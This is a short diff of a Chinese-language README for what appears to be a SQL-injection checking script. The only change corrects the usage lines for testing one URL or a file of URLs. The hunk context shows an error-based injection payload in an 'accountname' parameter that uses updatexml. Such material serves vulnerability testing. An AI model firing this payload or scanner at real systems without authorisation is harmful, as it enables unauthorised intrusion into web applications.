@@ -29,7 +29,7 @@ accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--
 ### 4.py脚本使用
 
 ```
-python3 360 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
-python3 360 脚本文件名 -f url.txt             # 测试多个url
+python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
+python3 脚本文件名 -f url.txt             # 测试多个url
 ```
 
